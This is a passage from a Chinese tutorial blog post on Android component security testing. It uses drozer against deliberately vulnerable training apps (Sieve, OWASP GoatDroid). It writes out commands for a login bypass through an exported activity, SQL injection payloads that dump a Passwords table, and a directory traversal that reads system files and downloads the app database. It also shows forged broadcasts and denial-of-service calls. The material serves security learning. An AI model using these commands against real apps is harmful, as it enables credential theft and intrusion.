data-src="/../images/app/Components/image-20221118212227708.png" data-caption="image-20221118212227708"><img src="/../images/app/Components/image-20221118212227708.png" alt="image-20221118212227708"></a></p><p>由于列出的包名众多，无法正确分辨需测试的 APP 包名为哪个，我们转用 <a href="https://codeload.github.com/bihe0832/Android-GetAPKInfo/zip/refs/tags/V2.0.2">GetAPKInfo</a> 工具来获取 sieve app 包名, <code>java -jar GetAPKInfo.jar C:\Users\Boom\Desktop\sieve.apk</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118213337410.png" data-caption="image-20221118213337410"><img src="/../images/app/Components/image-20221118213337410.png" alt="image-20221118213337410"></a></p><p>然后 drozer 直接搜索包名信息 com.mwr.example.sieve,该APP具体信息如下</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118214341449.png" data-caption="image-20221118214341449"><img src="/../images/app/Components/image-20221118214341449.png" alt="image-20221118214341449"></a></p><p>我们直接去查询目标应用的攻击面，通过下图可知 Activity 有3个组件是可以导出的</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230150630239.png" data-caption="image-20221230150630239"><img src="/../images/app/Components/image-20221230150630239.png" alt="image-20221230150630239"></a></p><p>查看具体可导出的 Activity 组件信息</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230150719923.png" data-caption="image-20221230150719923"><img src="/../images/app/Components/image-20221230150719923.png" alt="image-20221230150719923"></a></p><p>调用组件，实现登录绕过界面（由于测试样本不支持高版本 Android，所以这里使用 MuMu 模拟器进行测试，实现绕过），其它 Activity 导出组件绕过测试只需更换组件名即可</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230203111751.jpg" data-caption="image-20221230203111751"><img src="/../images/app/Components/image-20221230203111751.jpg" alt="image-20221230203111751"></a></p><br/><h4 id="钓鱼欺诈-x2F-Activity劫持"><a href="#钓鱼欺诈-x2F-Activity劫持" class="headerlink" title="钓鱼欺诈&#x2F;Activity劫持"></a><font color=#ffffff>钓鱼欺诈&#x2F;Activity劫持</font></h4><p>例子：劫持测试 APP 下载地址:<a href="https://github.com/yanghaoi/android_app">https://github.com/yanghaoi/android_app</a></p><p>1、手机安装点击劫持软件 uihijackv2.0_sign.apk , drozer 开启端口转发，adb 连接 drozer</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228105855609.png" data-caption="image-20221228105855609"><img src="/../images/app/Components/image-20221228105855609.png" alt="image-20221228105855609"></a></p><p>2、打开被测软件界面，这里被测软件也是使用 drozer，然后 Windows 通过 drozer 命令调用劫持软件 uihijackv2.0_sign，<font color=#c3dbe8>若 uihijackv2.0_sign 界面位于被测软件上，则存在漏洞（如下图）</font>，若被测页面无变化则不存在漏洞。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228110911255.png" data-caption="image-20221228110911255"><img src="/../images/app/Components/image-20221228110911255.png" alt="image-20221228110911255"></a></p><br/><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a><font color=#ffffff>拒绝服务攻击</font></h4><p>例子：测试 APP 下载地址：<a href="https://github.com/Funsiooo/Vuln_Bulid/blob/main/APP/OWASP-GoatDroid-0.9.zip">https://github.com/Funsiooo/Vuln_Bulid/blob/main/APP/OWASP-GoatDroid-0.9.zip</a></p><p>1、利用 drozer 直接查看暴露的组件，然后进行调用，查看是否出现程序崩溃情况。通过 <a href="https://codeload.github.com/bihe0832/Android-GetAPKInfo/zip/refs/tags/V2.0.2">GetAPKInfo</a> 工具来获取 APP 包名为 <code>org.owasp.goatdroid.fourgoats</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228143353936.png" data-caption="image-20221228143353936"><img src="/../images/app/Components/image-20221228143353936.png" alt="image-20221228143353936"></a></p><p>2、安装 <code>OWASP GoatDroid- FourGoats Android App.apk</code> 软件，利用 drozer 查看其暴露组件</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228143724432.png" data-caption="image-20221228143724432"><img src="/../images/app/Components/image-20221228143724432.png" alt="image-20221228143724432"></a></p><p>查看具体暴露组件</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228143848311.png" data-caption="image-20221228143848311"><img src="/../images/app/Components/image-20221228143848311.png" alt="image-20221228143848311"></a></p><p>3、调用组件，查看是否导致拒绝服务，若程序出现 <code>程序崩溃</code>、<code>已停止运行</code> 等程序无法运行或自动退出行为则为攻击成功。查看例子：<a href="http://rui0.cn/archives/30">http://rui0.cn/archives/30</a> ，调用命令例子如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.Main</span><br></pre></td></tr></table></figure></div><br/><h3 id="Conten-Provid"><a href="#Conten-Provid" class="headerlink" title="Conten Provid"></a>Conten Provid</h3><p>数据共享组件，用于向其他组件乃至其他应用共享数据，由此可推算，该组件漏洞与数据相关。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 漏洞种类 | 危害            |</span><br><span class="line">| -------- | ---------------|</span><br><span class="line">| 信息泄露 | 查看组件数据信息 |</span><br><span class="line">| SQL注入  | 注入获取相关数据 |</span><br><span class="line">| 目录遍历 | 访问任意可读文件 |</span><br></pre></td></tr></table></figure></div><br/><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a><font color=#ffffff>信息泄露</font></h4><p>1、依然使用 seive.apk 作为测试 app，但需要在第一次安装打开时需要设置账号密码</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228204134046.png" data-caption="image-20221228204134046"><img src="/../images/app/Components/image-20221228204134046.png" alt="image-20221228204134046"></a></p><p>2、利用 drozer 查看 provider 数据组件具体的攻击面</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228151737611.png" data-caption="image-20221228151737611"><img src="/../images/app/Components/image-20221228151737611.png" alt="image-20221228151737611"></a></p><p>3、对 <code>com.mwr.example.sieve.DBContentProvider</code> 攻击面进行测试，列出 URI</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.finduri com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228151941707.png" data-caption="image-20221228151941707"><img src="/../images/app/Components/image-20221228151941707.png" alt="image-20221228151941707"></a></p><p>4、利用 drozer 扫描模块对列出的 URI 进行扫描，查看可访问的 URI ，三个 URI 可访问</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228152408647.png" data-caption="image-20221228152408647"><img src="/../images/app/Components/image-20221228152408647.png" alt="image-20221228152408647"></a></p><p>5、访问URI，查看具体内容 ，由下图可知，刚才我们所填的数据全部列了出来</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154520099.png" data-caption="image-20221228154520099"><img src="/../images/app/Components/image-20221228154520099.png" alt="image-20221228154520099"></a></p><br/><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><font color=#ffffff>SQL注入</font></h4><p>1、进一步测试可访问的 URI 是否存在注入</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure></div><p>出现语法错误，存在SQL注入</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228153720244.png" data-caption="image-20221228153720244"><img src="/../images/app/Components/image-20221228153720244.png" alt="image-20221228153720244"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228153747173.png" data-caption="image-20221228153747173"><img src="/../images/app/Components/image-20221228153747173.png" alt="image-20221228153747173"></a></p><p>2、利用 drozer 内置注入扫描模块进行扫描,扫描存在注入</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154604350.png" data-caption="image-20221228154604350"><img src="/../images/app/Components/image-20221228154604350.png" alt="image-20221228154604350"></a></p><p>3、继续利用，列出所有数据表，得知数据库表有 <code>name</code>、<code>android_metadata</code>、<code>Passwords</code>、<code>Key</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154446929.png" data-caption="image-20221228154446929"><img src="/../images/app/Components/image-20221228154446929.png" alt="image-20221228154446929"></a></p><p>4、单独查看表中数据，例查询 <code>Passwords</code> 表数据</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Passwords;--&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154427706.png" data-caption="image-20221228154427706"><img src="/../images/app/Components/image-20221228154427706.png" alt="image-20221228154427706"></a></p><br/><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><font color=#ffffff>目录遍历</font></h4><p>1、利用 drozer 自带模块扫描目录遍历，存在两个漏洞 <code>content://com.mwr.example.sieve.FileBackupProvider/</code>,<code>content://com.mwr.example.sieve.FileBackupProvider</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228160057841.png" data-caption="image-20221228160057841"><img src="/../images/app/Components/image-20221228160057841.png" alt="image-20221228160057841"></a></p><p>2、对其 URI 进行文件读取</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228160259984.png" data-caption="image-20221228160259984"><img src="/../images/app/Components/image-20221228160259984.png" alt="image-20221228160259984"></a></p><p>3、读取更多信息</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228160839383.png" data-caption="image-20221228160839383"><img src="/../images/app/Components/image-20221228160839383.png" alt="image-20221228160839383"></a></p><p>4、下载文件 (C:\Users\oooo\Desktop\database.db为文件保存路径)</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:\\Users\\oooo\\Desktop\\database.db</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228161024128.png" data-caption="image-20221228161024128"><img src="/../images/app/Components/image-20221228161024128.png" alt="image-20221228161024128"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228161043428.png" data-caption="image-20221228161043428"><img src="/../images/app/Components/image-20221228161043428.png" alt="image-20221228161043428"></a></p><br/><h3 id="Broadcast-Receiver"><a href="#Broadcast-Receiver" class="headerlink" title="Broadcast Receiver"></a>Broadcast Receiver</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 漏洞种类     | 危害                                                         |</span><br><span class="line">| ------------ | ------------------------------------------------------------ |</span><br><span class="line">| 敏感信息泄露 | 发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。 |</span><br><span class="line">| 权限绕过     | 可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过&lt;receiver&gt;标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等 |</span><br><span class="line">| 消息伪造     | 暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患 |</span><br><span class="line">| 拒绝服务     | 如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。 拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。 |</span><br></pre></td></tr></table></figure></div><br/><h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a><font color=#ffffff>拒绝服务</font></h4><p>1、查看针对 broadcast 数据组件具体的攻击面</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20231122111055505.png" data-caption="image-20231122111055505"><img src="/../images/app/Components/image-20231122111055505.png" alt="image-20231122111055505"></a></p><p>2、针对 broadcast 攻击面进行测试需要先找到相应的 action 名，由上图可知，broadcast 组件名称为 org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver 这边使用 jadx 进行反编译，查看 AndroidManifest.xml 寻找 action，关键搜索 .broadcastreceivers.SendSMSNowReceiver</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164227532.png" data-caption=""><img src="/../images/app/Components/image-20221228164227532.png" alt=""></a></p><p>未执行前</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164826268.png" data-caption="image-20221228164826268"><img src="/../images/app/Components/image-20221228164826268.png" alt="image-20221228164826268"></a></p><p>执行后，程序退出，导致拒绝服务</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164917550.png" data-caption="image-20221228164917550"><img src="/../images/app/Components/image-20221228164917550.png" alt="image-20221228164917550"></a></p><br/><h4 id="消息伪造（发送恶意广播）"><a href="#消息伪造（发送恶意广播）" class="headerlink" title="消息伪造（发送恶意广播）"></a><font color=#ffffff>消息伪造（发送恶意广播）</font></h4><p>1、查看针对 broadcast 数据组件具体的攻击面</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broacast.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20231122111055505.png" data-caption="image-20231122111055505"><img src="/../images/app/Components/image-20231122111055505.png" alt="image-20231122111055505"></a></p><p>2、利用 jadx 反编译 apk，查看 broadcast receivers 模块具体代码，审计 .broadcastreceivers.SendSMSNowReceiver 代码可知发送广播需要两个参数命令</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228163829810.png" data-caption="image-20221228163829810"><img src="/../images/app/Components/image-20221228163829810.png" alt="image-20221228163829810"></a></p><p>action 名称为 org.owasp.goatdroid.fourgoats.SOCIAL_SMS</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164227532.png" data-caption="image-20221228164227532"><img src="/../images/app/Components/image-20221228164227532.png" alt="image-20221228164227532"></a></p><p>具体执行代码为</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 13800000000 --extra string message test</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164509817.png" data-caption="image-20221228164509817"><img src="/../images/app/Components/image-20221228164509817.png" alt="image-20221228164509817"></a></p><br/><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>参考文章：Service(服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 漏洞种类    | 危害                                                         |</span><br><span class="line">| ----------- | ------------------------------------------------------------ |</span><br><span class="line">| 权限提升    | 当一个service配置了intent``-``filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。 |</span><br><span class="line">| service劫持 | 隐式启动services,当存在同名services,先安装应用的services优先级高 |</span><br><span class="line">| 消息伪造    | 暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患 |</span><br><span class="line">| 拒绝服务    | Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃 |</span><br></pre></td></tr></table></figure></div><br/><h4 id="拒绝服务-1"><a href="#拒绝服务-1" class="headerlink" title="拒绝服务"></a><font color=#ffffff>拒绝服务</font></h4><p>1、查看针对 service 组件具体的攻击面</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228162300918.png" data-caption="image-20221228162300918"><img src="/../images/app/Components/image-20221228162300918.png" alt="image-20221228162300918"></a></p><p>打开 FourGoats app 停留在首页界面，由于存漏洞，直接调用导致拒绝服务，APP程序自动退出，返回桌面</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228162847713.png" data-caption="image-20221228162847713"><img src="/../images/app/Components/image-20221228162847713.png" alt="image-20221228162847713"></a></p><p>更多具体例子请参考文章：<a href="https://bbs.pediy.com/thread-269255.htm">https://bbs.pediy.com/thread-269255.htm</a></p><hr><h2 id="四、扩展知识点"><a href="#四、扩展知识点" class="headerlink" title="四、扩展知识点"></a>四、扩展知识点</h2><h3 id="adb使用"><a href="#adb使用" class="headerlink" title="adb使用"></a>adb使用</h3><p>adb查看连接设备的android日志</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//格式1：打印默认日志数据</span><br><span class="line">adb logcat </span><br><span class="line"></span><br><span class="line">//格式2：需要打印日志详细时间的简单数据</span><br><span class="line">adb logcat -v time</span><br><span class="line"></span><br><span class="line">//格式3：需要打印级别为Error的信息</span><br><span class="line">adb logcat *:E</span><br><span class="line"></span><br><span class="line">//格式4：需要打印时间和级别是Error的信息</span><br><span class="line">adb logcat -v time *:E</span><br><span class="line"></span><br><span class="line">//格式5：将日志保存到电脑固定的位置，比如D:\log.txt</span><br><span class="line">adb logcat -v time &gt;D:\log.txt</span><br><span class="line"></span><br><span class="line">//格式5：日志监听</span><br><span class="line">adb logcat |grep packagename(app包名)</span><br></pre></td></tr></table></figure></div><br/><h3 id="APP模块说明"><a href="#APP模块说明" class="headerlink" title="APP模块说明"></a>APP模块说明</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 模块名                    | 作用                                                        |</span><br><span class="line">| ------------------------- | ----------------------------------------------------------- |</span><br><span class="line">| app.activity.forintent    | 通过intent查找它的activity                                  |</span><br><span class="line">| app.activity.info         | 获取activities信息                                          |</span><br><span class="line">| app.activity.start        | 开启 Activity                                               |</span><br><span class="line">| app.broadcast.info        | 获取broadcast receivers信息                                 |</span><br><span class="line">| app.broadcast.send        | 发送广播                                                    |</span><br><span class="line">| app.broadcast.sniff       | 嗅探广播中intent的数据                                      |</span><br><span class="line">| app.package.attacksurface | 确定安装包的可攻击面                                        |</span><br><span class="line">| app.package.backup        | 列出可备份的包                                              |</span><br><span class="line">| app.package.debuggable    | 列出可debug的包                                             |</span><br><span class="line">| app.package.info          | 获取已安装包的信息                                          |</span><br><span class="line">| app.package.launchintent  | 获取程序启动的activity信息                                  |</span><br><span class="line">| app.package.list          | 手机已安装的程序包                                          |</span><br><span class="line">| app.package.manifest      | 获取程序manifest文件信息                                    |</span><br><span class="line">| app.package.native        | 列出Native libraries 信息                                   |</span><br><span class="line">| app.package.shareduid     | 查找拥有共同uid的包和他们所有的权限                         |</span><br><span class="line">| app.provider.columns      | 展示content provider URI的各列                              |</span><br><span class="line">| app.provider.delete       | 删除content provider URI的内容                              |</span><br><span class="line">| app.provider.download     | 使用openInputStream读取指定uri的内容，并下载在电脑中        |</span><br><span class="line">| app.provider.info         | 获取 content providers信息                                  |</span><br><span class="line">| app.provider.insert       | 插入数据到content provider                                  |</span><br><span class="line">| app.provider.query        | 查询content provider 内容                                   |</span><br><span class="line">| app.provider.read         | 使用openInputStream读取指定uri的内容                        |</span><br><span class="line">| app.provider.update       | 更新content provider的内容                                  |</span><br><span class="line">| app.service.info          | 获取services的信息                                          |</span><br><span class="line">| app.service.send          | 使用 Message攻击暴露的service，其service实现了handleMessage |</span><br><span class="line">| app.service.start         | 开启服务                                                    |</span><br><span class="line">| app.service.stop          | 停止服务                                                    |</span><br></pre></td></tr></table></figure></div><br/><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>文章编写断断续续，内容多为参考网上师傅们的文章，属于前人栽树，后人乘凉了，知识点也是好几年前的知识，一系列学习下来，扩展了 APP 测试攻击的思路，总体上测试基于 drozer 工具下进行测试，根据每个组件的特性进行单点突破，收获还是有的。</p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://blog.yorek.xyz/android/paid/zsxq/week17-android-components/</span><br><span class="line">https://bbs.pediy.com/thread-269211.htm</span><br><span class="line">https://bbs.pediy.com/thread-269255.htm</span><br><span class="line">https://bbs.pediy.com/thread-269309.htm</span><br><span class="line">https://bbs.pediy.com/thread-269447.htm</span><br><span class="line">https://www.cnblogs.com/wjrblogs/p/13953761.html</span><br><span class="line">https://dl.google.com/android/repository/platform-tools_r33.0.3-windows.zip</span><br><span class="line">https://bbs.pediy.com/thread-262208.htm</span><br><span class="line">https://www.cnblogs.com/zhaoyixiang/p/11236458.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 四大组件 </tag>
            
            <tag> APP测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具使用篇(一)-Mitmproxy中间人代理</title>
      <link href="/2022/12/11/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AF%87(%E4%B8%80)-Mitmproxy%E4%B8%AD%E9%97%B4%E4%BA%BA%E4%BB%A3%E7%90%86/"/>
      <url>/2022/12/11/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AF%87(%E4%B8%80)-Mitmproxy%E4%B8%AD%E9%97%B4%E4%BA%BA%E4%BB%A3%E7%90%86/</url>
      
